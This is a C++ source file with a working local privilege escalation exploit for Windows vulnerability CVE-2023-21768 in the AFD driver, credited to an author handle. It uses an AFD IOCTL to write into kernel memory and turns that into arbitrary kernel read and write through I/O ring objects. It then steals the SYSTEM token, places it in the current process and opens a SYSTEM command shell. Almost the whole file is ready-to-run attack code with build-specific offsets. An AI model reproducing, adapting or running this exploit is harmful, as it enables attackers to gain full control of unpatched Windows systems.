// winsock2.h 必须在 windows.h 之前引入
// network.hpp 定义了 WIN32_LEAN_AND_MEAN 排除了旧 winsock.h，不会冲突
// 但为了保险，显式包含 winsock2 再包含 network.hpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include "exp.hpp"
#include "include/common/gadget.hpp"
using namespace CVE_2023_21768;
namespace CVE_2023_21768
{
    void banner() {
        std::cout << "┏━╸╻ ╻┏━╸   ┏━┓┏━┓┏━┓┏━┓   ┏━┓╺┓ ┏━┓┏━┓┏━┓\n";
        std::cout << "┃  ┃┏┛┣╸ ╺━╸┏━┛┃┃┃┏━┛╺━┫╺━╸┏━┛ ┃   ┃┣━┓┣━┫\n";
        std::cout << "┗━╸┗┛ ┗━╸   ┗━╸┗━┛┗━╸┗━┛   ┗━╸╺┻╸  ╹┗━┛┗━┛\n";
        std::cout << "     by Joe1sn(https://github.com/Joe1sn/)\n";
    }
    // 任意地址写1，漏洞原型
    bool writeVuln(ULONG_PTR targetAddr, DWORD val) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);

        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in addr = { 0 };
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = 0;// 0 = 自动分配端口
        bind(s, (sockaddr*)&addr, sizeof(addr));
        sockaddr_in localAddr;
        int len = sizeof(localAddr);

        _IO_STATUS_BLOCK IoStatusBlock = { 0 };
        IoStatusBlock.Information = 0x10;
        HANDLE ioh = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
        NtSetIoCompletion_t NtSetIoCompletion =
            (NtSetIoCompletion_t)GetProcAddress(
                GetModuleHandleA("ntdll.dll"),
                "NtSetIoCompletion"
            );
        DWORD expectVal = val;
        for (size_t i = 0; i < expectVal; i++)
        {
            NTSTATUS ret = NtSetIoCompletion(ioh, nullptr, nullptr, 0, 0x1);
            if (!NT_SUCCESS(ret)) {
                std::cout << "[!] error at index." << std::hex << i << std::dec << "\n";
                break;
            }
            Sleep(100);
        }

        afdStruct input = { 0 };
        char* junkbuffer[0x100] = { 0 };
        char* junkbuffer2[0x100] = { 0 };
        input.validHandle = ioh;
        input.loopCount1 = 1;
        input.valPtr1 = reinterpret_cast<void*>(junkbuffer2);
        input.valPtr2 = reinterpret_cast<void*>(targetAddr);
        input.val4 = expectVal;
        input.ptr = reinterpret_cast<void*>(junkbuffer);

        NtDeviceIoControlFile(reinterpret_cast<HANDLE>(s), NULL, nullptr, nullptr, &IoStatusBlock, 0x12127, reinterpret_cast<PVOID>(&input), sizeof(afdStruct), nullptr, 0x00);
        closesocket(s);
        WSACleanup();
        return false;
    }

    bool arbitraryWrite(HIORING ioring, ULONG_PTR pBuffer, HANDLE hWPipeServer, HANDLE hWPipeClient, PVOID writeDst, PVOID writeBuffer, DWORD len) {
        bool result = true;
        IORING_CQE cqe = { 0 };
        HRESULT status = S_OK;
        PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;

        // 先将内容写入管道
        status = WriteFile(hWPipeServer, writeBuffer, len, NULL, NULL);
        if (status == 0) {
            printf("[x] Error when write file\n");
            result = false;
            goto clear;
        }

        // 重新设置假缓冲区中保存的相关字段信息
        // https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/
        pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
        pMcBufferEntry->Address = writeDst;
        pMcBufferEntry->Length = len;
        pMcBufferEntry->Type = 0xc02;
        pMcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
        pMcBufferEntry->AccessMode = 1;
        pMcBufferEntry->ReferenceCount = 1;
        reinterpret_cast<PULONGLONG>(pBuffer)[0] = (ULONGLONG)pMcBufferEntry;

        status = BuildIoRingReadFile(ioring, IoRingHandleRefFromHandle(hWPipeClient), IoRingBufferRefFromIndexAndOffset(0, 0), len, 0, NULL, IOSQE_FLAGS_NONE);
        if (status != S_OK) {
            printf("[x] Error when read file with ioring\n");
            status = S_FALSE;
            goto clear;
        }

        status = SubmitIoRing(ioring, 0, 0, NULL);
        if (status != S_OK) {
            printf("[x] Error when submit ioring\n");
            status = S_FALSE;
            goto clear;
        }

        status = PopIoRingCompletion(ioring, &cqe);
        if (status != S_OK) {
            printf("[x] Error when pop ioring\n");
            status = S_FALSE;
            goto clear;
        }

        if (cqe.ResultCode != S_OK) {
            printf("[x] IORing read operation failed\n");
            status = S_FALSE;
            goto clear;
        }

    clear:
        if (NULL != pMcBufferEntry)
        {
            VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        }
        return status;
    }

    bool arbitraryRead(HIORING ioring, ULONG_PTR pBuffer, HANDLE hRPipeServer, HANDLE hRPipeClient, PVOID Src, PVOID Buffer, DWORD len) {
        bool result = true;
        IORING_CQE cqe = { 0 };
        HRESULT status = S_OK;
        PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;

        // 重新设置假缓冲区中保存的相关字段信息
        // https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/
        pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
        pMcBufferEntry->Address = Src;
        pMcBufferEntry->Length = len;
        pMcBufferEntry->Type = 0xc02;
        pMcBufferEntry->Size = 0x80; // 0x20 * (numberOfPagesInBuffer + 3)
        pMcBufferEntry->AccessMode = 1;
        pMcBufferEntry->ReferenceCount = 1;
        reinterpret_cast<PULONGLONG>(pBuffer)[0] = (ULONGLONG)pMcBufferEntry;

        status = BuildIoRingWriteFile(ioring, IoRingHandleRefFromHandle(hRPipeClient), IoRingBufferRefFromIndexAndOffset(0, 0), len, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
        if (status != S_OK) {
            printf("[x] Error when write file with ioring\n");
            result = false;
            goto clear;
        }
        status = SubmitIoRing(ioring, 0, 0, NULL);
        if (status != S_OK) {
            printf("[x] Error when submit ioring\n");
            result = false;
            goto clear;
        }
        status = PopIoRingCompletion(ioring, &cqe);
        if (status != S_OK) {
            printf("[x] Error when pop ioring\n");
            result = false;
            goto clear;
        }

        if (cqe.ResultCode != S_OK) {
            printf("[x] IORing write operation failed\n");
            result = false;
            goto clear;
        }

        // 最后从管道中读取数据
        status = ReadFile(hRPipeServer, Buffer, len, NULL, NULL);
        if (status == 0) {
            printf("[x] Error when read file\n");
            result = false;
            goto clear;
        }
    clear:
        if (NULL != pMcBufferEntry)
        {
            VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        }
        return result;
    }

    void payload() { system("cmd"); }

    bool Exp() {
        banner();
        //1.创建两个命名管道
        //2.打开两个管道的客户端句柄
        HANDLE writeSrvPipe = CreateNamedPipe(writePipeName, PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
        HANDLE writeCliPipe = CreateFile(writePipeName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        HANDLE readSrvPipe = CreateNamedPipe(readPipeName, PIPE_ACCESS_DUPLEX, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x1000, 0x1000, 0, NULL);
        HANDLE readCliPipe = CreateFile(readPipeName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        HANDLE pipeCheckList[] = { writeSrvPipe, writeCliPipe,readSrvPipe, readCliPipe };
        for (size_t i = 0; i < 4; i++)
        {
            if (pipeCheckList[i] == INVALID_HANDLE_VALUE) {
                std::cerr << "[!] Init pipe failed\n";
                return false;
            }
        }

        //3.创建 I/O 环
        HRESULT ioResult;
        HIORING ioRingHandle;
        IORING_CREATE_FLAGS flags;
        IORING_HANDLE_REF requestDataFile = IoRingHandleRefFromHandle(NULL);
        IORING_BUFFER_REF requestDataBuffer = IoRingBufferRefFromPointer(NULL);
        flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
        flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
        ioResult = CreateIoRing(IORING_VERSION_3, flags, 0x10000, 0x20000, &ioRingHandle);
        if (!SUCCEEDED(ioResult))
        {
            printf("Failed creating IO ring handle: 0x%x\n", ioResult);
            return false;
        }

        //4.在堆中分配一个假的缓冲区数组
        LPVOID buffer = VirtualAlloc((LPVOID)ring3Addr, sizeof(PVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (buffer == NULL) {
            printf("[x] Error when alloc buffer\n");
            return false;
        }
        printf("[+]victim buffer at: %p\n", buffer);


        //5.找到的地址。
        // 新创建的 I/O 环对象
        // ring0 system token
        // ring3 process token
        ULONG_PTR ioRingKernelAddr;
        ULONG_PTR systemTokenAddr;
        ULONG_PTR processTokenAddr;
        printf("[*]now search IoRing kernel object address with value: %p\n", *reinterpret_cast<DWORD*>(ioRingHandle));
        exploit::memtools::bFindHandleObject(GetCurrentProcessId(), *reinterpret_cast<DWORD*>(ioRingHandle), reinterpret_cast<ULONG_PTR>(&ioRingKernelAddr));
        printf("[+]IO Ring handle kernel addr: %p\n", ioRingKernelAddr);

        exploit::memtools::bFindHandleObject(4, 4, reinterpret_cast<ULONG_PTR>(&systemTokenAddr));
        printf("[+]system EPROCESS addr: %p\n", systemTokenAddr);
        systemTokenAddr += exploit::gadget::X_22621_1105::tokenToEporcessOffset;
        printf("[+]system Token addr: %p\n", systemTokenAddr);

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, GetCurrentProcessId());
        exploit::memtools::bFindHandleObject(GetCurrentProcessId(), reinterpret_cast<ULONG_PTR>(hProc), reinterpret_cast<ULONG_PTR>(&processTokenAddr));
        printf("[+]process EPROCESS addr: %p\n", processTokenAddr);
        processTokenAddr += exploit::gadget::X_22621_1105::tokenToEporcessOffset;
        printf("[+]process Token addr: %p\n", processTokenAddr);

        //6.开始泄露system token值
        auto ioRingPtr = (_HIORING*)ioRingHandle;
        ioRingPtr->RegBufferArray = buffer;
        ioRingPtr->BufferArraySize = 1;
        PIORING_OBJECT ioringKernelPtr = reinterpret_cast<PIORING_OBJECT>(ioRingKernelAddr);
        writeVuln(reinterpret_cast<ULONG_PTR>(&(ioringKernelPtr->RegBuffersCount)), 1);
        writeVuln(reinterpret_cast<ULONG_PTR>(&(ioringKernelPtr->RegBuffers)) + 3, 1);
        printf("[+]all buffer sets\n");

        ULONG_PTR sysTokenValue;
        auto status = arbitraryRead(ioRingHandle, reinterpret_cast<ULONG_PTR>(buffer), readSrvPipe, readCliPipe, (PVOID)systemTokenAddr, &sysTokenValue, sizeof(ULONG_PTR));
        if (!status) {
            printf("[x]Error when read system token\n");
            return false;
        }
        printf("[+]system token value: %p\n", sysTokenValue);
        sysTokenValue &= 0xfffffffffffffff0;
        printf("[+]SystemToken after clear out is 0x%llx\n", sysTokenValue);

        //7.写入目标进程 TOKEN
        status = arbitraryWrite(ioRingHandle, reinterpret_cast<ULONG_PTR>(buffer), writeSrvPipe, writeCliPipe, (PVOID)processTokenAddr, &sysTokenValue, sizeof(ULONGLONG));
        if (status != S_OK) {
            printf("[x]Errpr when write target process token\n");
            goto cleanup;
        }
        printf("[+]success arbitraryWrite\n");

        printf("[+]Exploit done!\n");
        payload();
        // system("cmd");

        //8.结束，恢复正常状态
    cleanup:
        if (ioringKernelPtr) {
            byte clean = 0;
            //WriteData((char*)&(pIORING->RegBuffers) + 0x3, 0);
            arbitraryWrite(ioRingHandle, reinterpret_cast<ULONG_PTR>(buffer), writeSrvPipe, writeCliPipe, (char*)&(ioringKernelPtr->RegBuffers) + 0x3, &clean, 1);
            printf("[+] Clean RegBuffers in IORING_OBJECT done\n");
        }
        if (ioRingHandle) {
            auto phIORING = (_HIORING*)ioRingHandle;
            phIORING->RegBufferArray = 0;
            printf("[+] Clean field in HIORING done\n");
            CloseIoRing(ioRingHandle);
        }
        return true;
    }
} // namespace CVE_2023_21768